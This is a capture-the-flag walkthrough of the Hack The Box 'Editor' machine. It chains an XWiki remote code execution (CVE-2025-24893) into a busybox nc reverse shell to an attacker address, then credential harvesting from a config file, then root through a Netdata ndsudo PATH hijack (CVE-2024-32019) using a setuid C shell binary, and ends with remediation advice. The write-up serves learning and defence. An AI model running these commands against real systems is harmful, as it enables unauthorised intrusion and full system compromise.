# Editor (HTB) â€” Detailed Walkthrough / README

**Target:** `editor.htb` (`10.10.11.80`)
**Difficulty:** Easy (Linux)
**Author:** Akarsh Saklani â€” detailed notes of exploitation and privilege escalation
**Date:** October 2025
**Scope / Legal:** This writeup documents a penetration test of a Hack The Box machine **for learning only**. Do **not** run against systems you do not own or have explicit permission to test.

---

## Table of Contents

* [Introduction](#introduction)
* [Summary of Findings](#summary-of-findings)
* [Lab Setup / Hosts](#lab-setup--hosts)
* [Tools used](#tools-used)
* [Enumeration](#enumeration)
* [Vulnerability Identification](#vulnerability-identification)
* [Exploitation â€” Initial Access (Reverse Shell)](#exploitation--initial-access-reverse-shell)
* [Post-Access Enumeration & Credentials Discovery](#post-access-enumeration--credentials-discovery)
* [User Flag (oliver)](#user-flag-oliver)
* [Privilege Escalation â€” Netdata ndsudo (CVE-2024-32019)](#privilege-escalation--netdata-ndsudo-cve-2024-32019)
* [Root Flag](#root-flag)
* [Remediation & Lessons Learned](#remediation--lessons-learned)
* [References](#references)

---

## Introduction

This walkthrough covers the **Editor** machine on Hack The Box. Initial access was obtained by exploiting **CVE-2025-24893** in XWiki (version 15.10.8) to get an interactive shell as the `xwiki` user. Subsequent enumeration uncovered a misconfigured Netdata `ndsudo` plugin vulnerable to **CVE-2024-32019**, enabling privilege escalation to root.

The exercise highlights two recurring real-world issues:

* Outdated/unguarded web applications exposing RCE vectors.
* Misconfigured privileged binaries/plugins (SUID) that allow full system compromise.

---

## Summary of Findings

* **Initial access:** RCE via XWiki (CVE-2025-24893) â†’ shell as `xwiki`.
* **Credentials discovered:** `theEd1t0rTeam99` found in XWiki `hibernate.cfg.xml` â†’ SSH access as `oliver`.
* **Privilege escalation:** Netdata `ndsudo` plugin (SUID-executable) vulnerable to CVE-2024-32019 â†’ arbitrary root execution.
* **Flags captured:**

  * `user.txt`: `bc2341152c638da4a05b91d91c1df26f`
  * `root.txt`: `6d4d6c2368c3210994e624647c93119f`

---

## Lab Setup / Hosts

Add to `/etc/hosts` for convenience:

```bash
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

Target: `http://editor.htb:8080` (XWiki), `http://editor.htb` redirects on port 80.

---

## Tools used

* `nmap` (version scan & scripts)
* `curl` / `wget`
* `gobuster` (for directory discovery)
* `nc` / `netcat` (listener)
* Python (exploit PoC)
* `scp`, `ssh`
* `gcc` (to compile local C exploit)
* Standard Linux tools: `find`, `grep`, `ls`, `cat`

---

## Enumeration

### Nmap

Run a basic service discovery scan:

```bash
nmap -sV -sC -Pn 10.10.11.80
```

**Relevant results**

* `22/tcp` â€” OpenSSH 8.9p1 (Ubuntu)
* `80/tcp` â€” nginx 1.18.0 (redirects to [http://editor.htb/](http://editor.htb/))
* `8080/tcp` â€” Jetty 10.0.20 with XWiki (WebDAV enabled). `robots.txt` contained disallowed paths.

### Web discovery

* Visiting `http://editor.htb:8080/` revealed an XWiki instance.
* XWiki version visible on the page footer: **15.10.8**.

---

## Vulnerability Identification

XWiki **15.10.8** (and versions < 15.10.11) is vulnerable to **CVE-2025-24893**, an authenticated RCE. There exist public Proof-of-Concept repositories demonstrating exploitation when authentication is possible or can be bypassed via exposed endpoints or misconfigurations.

(You used a public PoC to exploit the instance in this lab.)

---

## Exploitation â€” Initial Access (Reverse Shell)

### Clone PoC & exploit

On attacker machine:

```bash
git clone https://github.com/gunzf0x/CVE-2025-24893
cd CVE-2025-24893
```

Prepare a reverse-shell payload and run the PoC:

```bash
# start a listener on attacker machine
nc -lnvp 4444

# run the PoC against the target (example payload uses busybox nc)
python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.25 4444 -e /bin/bash'
```

On success, you will receive a reverse shell as the `xwiki` user. Make it interactive:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# optionally send ctrl-z then: stty raw -echo; fg
```

---

## Post-Access Enumeration & Credentials Discovery

While on the box as `xwiki`:

1. Check for other users and home directories:

```bash
cd /home
ls
# found: oliver
```

2. Look for application configuration files (XWiki):

```bash
# Inspect XWiki config where DB credentials may appear
cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep -i password -n
```

You found:

```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

This credential likely corresponds to a local user (or DB) and is useful for lateral privilege escalation.

---

## User Access â€” SSH as `oliver` & user flag

Use the discovered password to SSH:

```bash
ssh oliver@editor.htb
# password: theEd1t0rTeam99
```

Once logged in:

```bash
cd /home/oliver
ls
cat user.txt
# user.txt -> bc2341152c638da4a05b91d91c1df26f
```

---

## Privilege Escalation â€” Netdata ndsudo (CVE-2024-32019)

### SUID binaries enumeration

As `oliver` (or via the `xwiki` shell after pivot), search for SUID files:

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

This returned a Netdata plugin:

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

This plugin is vulnerable to **CVE-2024-32019** allowing execution of arbitrary binaries as root if `PATH` is manipulated or plugin execution flow accepts arbitrary commands.

### Exploit approach (local binary execution)

1. Create a small C program that spawns a root shell:

```c
/* exploit.c */
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

2. Compile on local attacker machine:

```bash
gcc exploit.c -o nvme
```

3. Transfer to the target (as `oliver`):

```bash
scp nvme oliver@editor.htb:/tmp
```

4. On the target:

```bash
cd /tmp
chmod +x nvme
# Prepend /tmp to PATH so ndsudo will execute our binary
export PATH=/tmp:$PATH

# Trigger the vulnerable plugin so it runs our binary as root
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Because the Netdata `ndsudo` plugin executes binaries without correctly sanitizing the `PATH` (or due to how it performs lookups), the `nvme` binary is executed with root privileges and spawns a root shell.

---

## Root Access & Flag

After successful exploitation:

```bash
whoami
# root

cat /root/root.txt
# 6d4d6c2368c3210994e624647c93119f
```

You now have full system compromise.

---

## Remediation & Lessons Learned

### Remediation

* **Update XWiki** to a version >= 15.10.11 immediately to remove CVE-2025-24893 (or apply vendor patches).
* **Harden Netdata / plugins**:

  * Remove SUID bits from plugins or ensure they do not execute external binaries based on a writable `PATH`.
  * Run monitoring agents with least privilege; avoid root unless required.
* **Secrets management**:

  * Do not store plaintext passwords in application config files. Use environment variables or secrets vaults and ensure file permissions limit access to necessary accounts.
* **Network exposure**:

  * Limit management interfaces (XWiki, Netdata) to internal networks or via VPN and require authentication with strong/unique credentials.
* **Periodic audits**:

  * Regularly scan for SUID/SGID files and validate their necessity.
  * Keep an inventory and apply security updates promptly.

### Lessons Learned

* Web application RCE combined with poor secret management and privileged local services leads to full compromise.
* Small misconfigurations (like an SUID plugin that respects `PATH`) are high-risk.
* Defence in depth (patching, least privilege, secret handling, network segmentation) mitigates chained attacks.

---

## References

* CVE-2025-24893 â€” XWiki RCE (PoC used in this walkthrough).
* CVE-2024-32019 â€” Netdata ndsudo SUID execution vulnerability.
* Official Netdata and XWiki security advisories (consult vendor pages for detailed patches).

---

## Final Notes

This writeup focused on **reproducible commands**, explicit artifacts (files/paths), and pragmatic remediation. If you'd like, I can:

* Convert this to a nicely formatted PDF or Markdown file for your portfolio.
* Produce a short `report.pdf` style summary for submission or a Twitter-length summary for sharing.

Stay ethical and keep learning â€” great job following through the full exploit chain! ðŸš€
